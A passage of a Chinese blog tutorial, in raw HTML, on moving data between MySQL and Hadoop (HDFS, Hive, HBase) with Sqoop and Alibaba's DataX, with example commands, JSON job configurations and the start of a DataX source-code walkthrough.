class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /opt/module/sqoop/bin</span></span><br><span class="line"><span class="comment"># ======================数据导入到HDFS====================</span></span><br><span class="line">sqoop import \</span><br><span class="line">--connect jdbc:mysql://hadoop102/datax \</span><br><span class="line">--username root \</span><br><span class="line">--password 123456 \</span><br><span class="line">--table student \</span><br><span class="line">--target-dir /tmp/root/111 \</span><br><span class="line">--fields-terminated-by <span class="string">','</span> \</span><br><span class="line">-m 1 </span><br><span class="line"><span class="comment"># table &lt;table name&gt;抽取mysql数据库中的表</span></span><br><span class="line"><span class="comment"># --target-dir &lt;path&gt;指定导入hdfs的具体位置。默认生成在为/user/&lt;user&gt;//目录下</span></span><br><span class="line"><span class="comment"># -m &lt;数值&gt;执行map任务的个数，默认是4个</span></span><br><span class="line"><span class="comment"># -m 参数可以指定 map 任务的个数，默认是 4 个。如果指定为 1 个 map 任务的话，最终生成的 part-m-xxxxx 文件个数就为 1。在数据充足的情况下，生成的文件个数与指定 map 任务的个数是等值的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================数据导入到Hive中======================</span></span><br><span class="line">sqoop import \</span><br><span class="line">--connect jdbc:mysql://10.6.6.72:3309/hive \</span><br><span class="line">--username root \</span><br><span class="line">--password root123 \</span><br><span class="line">--hive-import \</span><br><span class="line">--table ROLES \</span><br><span class="line">--hive-database default \</span><br><span class="line">--hive-table roles_test \</span><br><span class="line">--fields-terminated-by <span class="string">','</span> \</span><br><span class="line">-m 1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># --hive-import将表导入Hive中</span></span><br><span class="line"><span class="comment"># -m 参数可以指定 map 任务的个数，默认是 4 个。如果指定为 1 个 map 任务的话，最终生成在 /warehouse/tablespace/managed/hive/roles_test/base_xxxx 目录下的 000000_x 文件个数就为 1 。在数据充足的情况下，生成的文件个数与指定 map 任务的个数是等值的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================据导入到HBase中============================</span></span><br><span class="line">sqoop import \</span><br><span class="line">--connect jdbc:mysql://10.6.6.72:3309/hive \</span><br><span class="line">--username root \</span><br><span class="line">--password root123 \</span><br><span class="line">--table ROLES \</span><br><span class="line">--hbase-table roles_test \</span><br><span class="line">--column-family info \</span><br><span class="line">--hbase-row-key ROLE_ID \</span><br><span class="line">--hbase-create-table \</span><br><span class="line">--hbase-bulkload</span><br><span class="line"></span><br><span class="line"><span class="comment"># --column-family   &lt;family&gt;设置导入的目标列族</span></span><br><span class="line"><span class="comment"># --hbase-row-key   &lt;col&gt;指定要用作行键的输入列；如果没有该参数，默认为mysql表的主键</span></span><br><span class="line"><span class="comment"># --hbase-create-table 如果执行，则创建缺少的HBase表</span></span><br><span class="line"><span class="comment"># --hbase-bulkload 启用批量加载</span></span><br><span class="line"><span class="comment"># 总结：roles_test 表的 row_key 是源表的主键 ROLE_ID 值，其余列均放入了 info 这个列族中</span></span><br></pre></td></tr></table></figure><h3 id="3-2-Hadoop导出到Mysql">3.2 Hadoop导出到Mysql</h3><p>Sqoop export 工具将一组文件从 HDFS 导出回 Mysql 。目标表必须已存在于数据库中。根据用户指定的分隔符读取输入文件并将其解析为一组记录。默认操作是将这些转换为一组INSERT将记录注入数据库的语句。在“更新模式”中，Sqoop 将生成 UPDATE 替换数据库中现有记录的语句，并且在“调用模式”下，Sqoop 将为每条记录进行存储过程调用，将 HDFS、Hive、HBase的数据导出到 Mysql 表中，都会用到下表的参数：</p><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>–table &lt;table name&gt;</td><td>指定要导出的mysql目标表</td></tr><tr><td>–export-dir &lt;path&gt;</td><td>指定要导出的hdfs路径</td></tr><tr><td>–input-fields-terminated-by &lt;char&gt;</td><td>指定输入字段分隔符</td></tr><tr><td>-m &lt;数值&gt;</td><td>执行map任务的个数，默认是4个</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =======================HDFS数据导出至Mysql========================</span></span><br><span class="line"><span class="comment"># 首先在 test 数据库中创建 roles_hdfs 数据表</span></span><br><span class="line">sqoop <span class="built_in">export</span> \</span><br><span class="line">--connect jdbc:mysql://10.6.6.72:3309/<span class="built_in">test</span> \</span><br><span class="line">--username root \</span><br><span class="line">--password root123 \</span><br><span class="line">--table roles_hdfs \</span><br><span class="line">--<span class="built_in">export</span>-dir /tmp/root/111 \</span><br><span class="line">--input-fields-terminated-by <span class="string">','</span> \</span><br><span class="line">-m 1</span><br><span class="line"><span class="comment"># 执行数据导入过程中，会触发 MapReduce 任务。任务成功之后，前往 mysql 数据库查看是否导入成功</span></span><br><span class="line"><span class="comment"># =======================Hive数据导出至Mysql=======================</span></span><br><span class="line">sqoop <span class="built_in">export</span> \</span><br><span class="line">--connect jdbc:mysql://10.6.6.72:3309/<span class="built_in">test</span> \</span><br><span class="line">--username root \</span><br><span class="line">--password root123 \</span><br><span class="line">--table roles_hive \</span><br><span class="line">--<span class="built_in">export</span>-dir /warehouse/tablespace/managed/hive/roles_test/base_0000001 \</span><br><span class="line">--input-fields-terminated-by <span class="string">','</span> \</span><br><span class="line">-m 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================HBase数据不支持导出至Mysql==================</span></span><br></pre></td></tr></table></figure><p>其他具体可以参考：<a href="https://juejin.cn/post/6994768829163241479" target="_blank" rel="noopener" title="sqoop学习，这一篇文章就够了">sqoop学习，这一篇文章就够了</a> / <a href="https://cloud.tencent.com/developer/article/1479981" target="_blank" rel="noopener" title="Sqoop1.4.7实现将Mysql数据与Hadoop3.0数据互相抽取">Sqoop1.4.7实现将Mysql数据与Hadoop3.0数据互相抽取</a></p><h1>二、DataX概述与入门</h1><h2 id="1、DataX概述">1、DataX概述</h2><blockquote><p><a href="https://github.com/alibaba/DataX" target="_blank" rel="noopener" title="https://github.com/alibaba/DataX">https://github.com/alibaba/DataX</a></p></blockquote><h3 id="1-1-简介">1.1 简介</h3><p>DataX 是阿里巴巴开源的一个异构数据源离线同步工具，致力于实现包括关系型数据库(MySQL、Oracle 等)、HDFS、Hive、ODPS、HBase、FTP 等各种异构数据源之间稳定高效的数据同步功能</p><p>为了解决异构数据源同步问题，DataX 将复杂的网状的同步链路变成了星型数据链路， DataX 作为中间传输载体负责连接各种数据源。当需要接入一个新的数据源的时候，只需要将此数据源对接到DataX，便能跟已有的数据源做到无缝数据同步。DataX 目前已经有了比较全面的插件体系，主流的RDBMS 数据库、NOSQL、大数据计算系统都已经接入</p><h3 id="1-2-框架设计">1.2 框架设计</h3><ul><li>Reader：数据采集模块，负责采集数据源的数据，将数据发送给Framework</li><li>Writer：数据写入模块，负责不断向Framework取数据，并将数据写入到目的端</li><li>Framework：用于连接reader和writer，作为两者的数据传输通道，并处理缓冲，流控，并发，数据转换等核心技术问题</li></ul><h3 id="1-3-运行原理">1.3 运行原理</h3><p><img src="http://qnypic.shawncoding.top/blog/202305030923183.png" alt></p><p>举例来说，用户提交了一个 DataX 作业，并且配置了 20 个并发，目的是将一个 100 张分表的 mysql 数据同步到 odps 里面。 DataX 的调度决策思路是：</p><ul><li>DataXJob 根据分库分表切分成了 100 个 Task</li><li>根据 20 个并发，DataX 计算共需要分配 4 个 TaskGroup</li><li>4 个 TaskGroup 平分切分好的 100 个 Task，每一个 TaskGroup 负责以 5 个并发共计运行 25 个 Task</li></ul><h2 id="2、DataX与-Sqoop-的对比">2、DataX与 Sqoop 的对比</h2><blockquote><p>sqoop参考文档：<a href="https://juejin.cn/post/6994768829163241479" target="_blank" rel="noopener" title="https://juejin.cn/post/6994768829163241479">https://juejin.cn/post/6994768829163241479</a></p></blockquote><p>Sqoop已经被apache丢弃，后面建议都用datax</p><table><thead><tr><th><strong>功****能</strong></th><th><strong>DataX</strong></th><th><strong>Sqoop</strong></th></tr></thead><tbody><tr><td>运行模式</td><td>单进程多线程</td><td>MR</td></tr><tr><td>MySQL 读写</td><td>单机压力大；读写粒度容易控制</td><td>MR 模式重，写出错处理麻烦</td></tr><tr><td>Hive 读写</td><td>单机压力大</td><td>很好</td></tr><tr><td>文件格式</td><td>orc 支持</td><td>orc 不支持，可添加</td></tr><tr><td>分布式</td><td>不支持，可以通过调度系统规避</td><td>支持</td></tr><tr><td>流控</td><td>有流控功能</td><td>需要定制</td></tr><tr><td>统计信息</td><td>已有一些统计，上报需定制</td><td>没有，分布式的数据收集不方便</td></tr><tr><td>数据校验</td><td>在 core 部分有校验功能</td><td>没有，分布式的数据收集不方便</td></tr><tr><td>监控</td><td>需要定制</td><td>需要定制</td></tr><tr><td>社区</td><td>开源不久，社区不活跃</td><td>一直活跃，核心部分变动很少</td></tr></tbody></table><h2 id="3、快速入门">3、快速入门</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要jdk和python</span></span><br><span class="line">wget https://datax-opensource.oss-cn-hangzhou.aliyuncs.com/202303/datax.tar.gz</span><br><span class="line">tar -zxvf datax.tar.gz -C /opt/module/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行自检脚本</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/datax/bin/</span><br><span class="line">python datax.py /opt/module/datax/job/job.json</span><br></pre></td></tr></table></figure><h1>三、DataX常用入门案例</h1><h2 id="1、从stream-流读取数据并打印到控制台">1、从stream 流读取数据并打印到控制台</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 会显示出模板</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/datax/bin/</span><br><span class="line">python datax.py -r streamreader -w streamwriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据模板编写配置文件，在job目录下编码</span></span><br><span class="line">vim stream2stream.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">"job"</span>: &#123;</span><br><span class="line">   <span class="string">"content"</span>: [</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="string">"reader"</span>: &#123;</span><br><span class="line">         <span class="string">"name"</span>: <span class="string">"streamreader"</span>,</span><br><span class="line">         <span class="string">"parameter"</span>: &#123;</span><br><span class="line">           <span class="string">"sliceRecordCount"</span>: 10,</span><br><span class="line">           <span class="string">"column"</span>: [</span><br><span class="line">             &#123;</span><br><span class="line">               <span class="string">"type"</span>: <span class="string">"long"</span>,</span><br><span class="line">               <span class="string">"value"</span>: <span class="string">"10"</span></span><br><span class="line">             &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">               <span class="string">"type"</span>: <span class="string">"string"</span>,</span><br><span class="line">               <span class="string">"value"</span>: <span class="string">"hello，DataX"</span></span><br><span class="line">             &#125;</span><br><span class="line">           ]</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="string">"writer"</span>: &#123;</span><br><span class="line">         <span class="string">"name"</span>: <span class="string">"streamwriter"</span>,</span><br><span class="line">         <span class="string">"parameter"</span>: &#123;</span><br><span class="line">           <span class="string">"encoding"</span>: <span class="string">"UTF-8"</span>,</span><br><span class="line">           <span class="string">"print"</span>: <span class="literal">true</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   ],</span><br><span class="line">   <span class="string">"setting"</span>: &#123;</span><br><span class="line">     <span class="string">"speed"</span>: &#123;</span><br><span class="line">       <span class="string">"channel"</span>: 1</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">/opt/module/datax/bin/datax.py /opt/module/datax/job/stream2stream.json</span><br></pre></td></tr></table></figure><h2 id="2、读取-MySQL-中的数据存放到-HDFS">2、读取 MySQL 中的数据存放到 HDFS</h2><h3 id="2-1-查看官方模板">2.1 查看官方模板</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/alibaba/DataX/blob/master/mysqlreader/doc/mysqlreader.md</span></span><br><span class="line"><span class="comment"># https://github.com/alibaba/DataX/blob/master/hdfswriter/doc/hdfswriter.md</span></span><br><span class="line"><span class="comment"># MySQL的模板</span></span><br><span class="line">python /opt/module/datax/bin/datax.py -r mysqlreader -w hdfswriter</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202305030923184.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202305030923185.png" alt></p><h3 id="2-2-数据准备与配置">2.2 数据准备与配置</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database datax;</span><br><span class="line">mysql&gt; use datax;</span><br><span class="line">mysql&gt; create table student(id int,name varchar(20));</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into student values(1001,'zhangsan'),(1002,'lisi'),(1003,'wangwu');</span><br></pre></td></tr></table></figure><p><code>vim /opt/module/datax/job/mysql2hdfs.json</code>这里我配置了ha</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"job"</span>: &#123;</span><br><span class="line">   <span class="attr">"content"</span>: [</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">"reader"</span>: &#123;</span><br><span class="line">         <span class="attr">"name"</span>: <span class="string">"mysqlreader"</span>, </span><br><span class="line">         <span class="attr">"parameter"</span>: &#123;</span><br><span class="line">           <span class="attr">"column"</span>: [</span><br><span class="line">             <span class="string">"id"</span>,</span><br><span class="line">             <span class="string">"name"</span></span><br><span class="line">           ], </span><br><span class="line">           <span class="attr">"connection"</span>: [</span><br><span class="line">             &#123;</span><br><span class="line">               <span class="attr">"jdbcUrl"</span>: [</span><br><span class="line">                 <span class="string">"jdbc:mysql://hadoop102:3306/datax"</span></span><br><span class="line">               ], </span><br><span class="line">               <span class="attr">"table"</span>: [</span><br><span class="line">                 <span class="string">"student"</span></span><br><span class="line">               ]</span><br><span class="line">             &#125;</span><br><span class="line">           ], </span><br><span class="line">           <span class="attr">"username"</span>: <span class="string">"root"</span>, </span><br><span class="line">           <span class="attr">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;, </span><br><span class="line">       <span class="attr">"writer"</span>: &#123;</span><br><span class="line">         <span class="attr">"name"</span>: <span class="string">"hdfswriter"</span>, </span><br><span class="line">         <span class="attr">"parameter"</span>: &#123;</span><br><span class="line">           <span class="attr">"column"</span>: [</span><br><span class="line">             &#123;</span><br><span class="line">               <span class="attr">"name"</span>: <span class="string">"id"</span>,</span><br><span class="line">               <span class="attr">"type"</span>: <span class="string">"int"</span></span><br><span class="line">             &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">               <span class="attr">"name"</span>: <span class="string">"name"</span>,</span><br><span class="line">               <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">             &#125;</span><br><span class="line">           ], </span><br><span class="line">           <span class="attr">"defaultFS"</span>: <span class="string">"hdfs://testDfs"</span>, </span><br><span class="line">           <span class="attr">"fieldDelimiter"</span>: <span class="string">"\t"</span>, </span><br><span class="line">           <span class="attr">"fileName"</span>: <span class="string">"student.txt"</span>, </span><br><span class="line">           <span class="attr">"fileType"</span>: <span class="string">"text"</span>, </span><br><span class="line">           <span class="attr">"path"</span>: <span class="string">"/"</span>, </span><br><span class="line">           <span class="attr">"writeMode"</span>: <span class="string">"append"</span>,</span><br><span class="line">           <span class="attr">"hadoopConfig"</span>:&#123;</span><br><span class="line">            <span class="attr">"dfs.nameservices"</span>: <span class="string">"testDfs"</span>,</span><br><span class="line">            <span class="attr">"dfs.ha.namenodes.testDfs"</span>: <span class="string">"namenode1,namenode2,namenode3"</span>,</span><br><span class="line">            <span class="attr">"dfs.namenode.rpc-address.aliDfs.namenode1"</span>: <span class="string">"hadoop102:8020"</span>,</span><br><span class="line">            <span class="attr">"dfs.namenode.rpc-address.aliDfs.namenode2"</span>: <span class="string">"hadoop103:8020"</span>,</span><br><span class="line">            <span class="attr">"dfs.namenode.rpc-address.aliDfs.namenode3"</span>: <span class="string">"hadoop104:8020"</span>,</span><br><span class="line">            <span class="attr">"dfs.client.failover.proxy.provider.testDfs"</span>: <span class="string">"org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ], </span><br><span class="line">   <span class="attr">"setting"</span>: &#123;</span><br><span class="line">     <span class="attr">"speed"</span>: &#123;</span><br><span class="line">       <span class="attr">"channel"</span>: <span class="string">"1"</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-执行与结果">2.3 执行与结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python /opt/module/datax/bin/datax.py /opt/module/datax/job/mysql2hdfs.json</span><br><span class="line"><span class="comment"># 注意：HdfsWriter 实际执行时会在该文件名后添加随机的后缀作为每个线程写入实际文件名</span></span><br></pre></td></tr></table></figure><h2 id="3、读取-HDFS-数据写入-MySQL">3、读取 HDFS 数据写入 MySQL</h2><blockquote><p><a href="https://github.com/alibaba/DataX/blob/master/hdfsreader/doc/hdfsreader.md" target="_blank" rel="noopener" title="https://github.com/alibaba/DataX/blob/master/hdfsreader/doc/hdfsreader.md">https://github.com/alibaba/DataX/blob/master/hdfsreader/doc/hdfsreader.md</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 改名</span></span><br><span class="line">hadoop fs -mv /student.txt* /student.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看官方模板</span></span><br><span class="line">python bin/datax.py -r hdfsreader -w mysqlwriter</span><br></pre></td></tr></table></figure><p>创建配置文件<code>vim job/hdfs2mysql.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"job"</span>: &#123;</span><br><span class="line">    <span class="attr">"content"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"reader"</span>: &#123;</span><br><span class="line">          <span class="attr">"name"</span>: <span class="string">"hdfsreader"</span>, <span class="attr">"parameter"</span>: &#123;</span><br><span class="line">            <span class="attr">"column"</span>: [<span class="string">"*"</span>],</span><br><span class="line">            <span class="attr">"defaultFS"</span>: <span class="string">"hdfs://hadoop102:8020"</span>, </span><br><span class="line">            <span class="attr">"encoding"</span>: <span class="string">"UTF-8"</span>, </span><br><span class="line">            <span class="attr">"fieldDelimiter"</span>: <span class="string">"\t"</span>,</span><br><span class="line">            <span class="attr">"fileType"</span>: <span class="string">"text"</span>, </span><br><span class="line">            <span class="attr">"path"</span>: <span class="string">"/student.txt"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"writer"</span>: &#123;</span><br><span class="line">          <span class="attr">"name"</span>: <span class="string">"mysqlwriter"</span>, </span><br><span class="line">          <span class="attr">"parameter"</span>: &#123;</span><br><span class="line">            <span class="attr">"column"</span>: [</span><br><span class="line">              <span class="string">"id"</span>, <span class="string">"name"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"connection"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"jdbcUrl"</span>: <span class="string">"jdbc:mysql://hadoop102:3306/datax"</span>, </span><br><span class="line">                <span class="attr">"table"</span>: [<span class="string">"student2"</span>]</span><br><span class="line">              &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"password"</span>: <span class="string">"123456"</span>, </span><br><span class="line">            <span class="attr">"username"</span>: <span class="string">"root"</span>, </span><br><span class="line">            <span class="attr">"writeMode"</span>: <span class="string">"insert"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"setting"</span>: &#123;</span><br><span class="line">      <span class="attr">"speed"</span>: &#123;</span><br><span class="line">        <span class="attr">"channel"</span>: <span class="string">"1"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于hadoop高可用的配置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">"hadoopConfig":&#123;</span><br><span class="line">       "dfs.nameservices": "testDfs",</span><br><span class="line">       "dfs.ha.namenodes.testDfs": "namenode1,namenode2",</span><br><span class="line">       "dfs.namenode.rpc-address.aliDfs.namenode1": "",</span><br><span class="line">       "dfs.namenode.rpc-address.aliDfs.namenode2": "",</span><br><span class="line">       "dfs.client.failover.proxy.provider.testDfs": "org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 MySQL 的 datax 数据库中创建 student2</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use datax;</span><br><span class="line">mysql&gt; create table student2(id int,name varchar(20));</span><br></pre></td></tr></table></figure><p>开始执行<code>python bin/datax.py job/hdfs2mysql.json</code></p><h2 id="4、其他数据库">4、其他数据库</h2><blockquote><p>详见官网：<a href="https://github.com/alibaba/DataX" target="_blank" rel="noopener" title="https://github.com/alibaba/DataX">https://github.com/alibaba/DataX</a></p></blockquote><h1>四、DataX源码分析</h1><h2 id="1、总体执行流程">1、总体执行流程</h2><p><img src="http://qnypic.shawncoding.top/blog/202305030923186.png" alt></p><h2 id="2、程序入口">2、程序入口</h2><p><a href="http://datax.py" target="_blank" rel="noopener">datax.py</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">ENGINE_COMMAND = <span class="string">"java -server $&#123;jvm&#125; %s -classpath %s  $&#123;params&#125; com.alibaba.datax.core.Engine -mode $&#123;mode&#125; -jobid $&#123;jobid&#125; -job $&#123;job&#125;"</span> % (DEFAULT_PROPERTY_CONF, CLASS_PATH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到入口类com.alibaba.datax.core.Engine，搜索main方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(Configuration allConf)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">//JobContainer会在schedule后再行进行设置和调整值</span></span><br><span class="line">        <span class="keyword">int</span> channelNumber =<span class="number">0</span>;</span><br><span class="line">        AbstractContainer container;</span><br><span class="line">        <span class="keyword">long</span> instanceId;</span><br><span class="line">        <span class="keyword">int</span> taskGroupId = -<span class="number">1</span>;</span><br><span class="line">        ......</span><br><span class="line">        container.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//JobContainer.java</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jobContainer主要负责的工作全部在start()里面，包括init、prepare、split、scheduler、</span></span><br><span class="line"><span class="comment"> * post以及destroy和statistics</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LOG.info(<span class="string">"DataX jobContainer starts job."</span>);</span><br><span class="line"></span><br><span 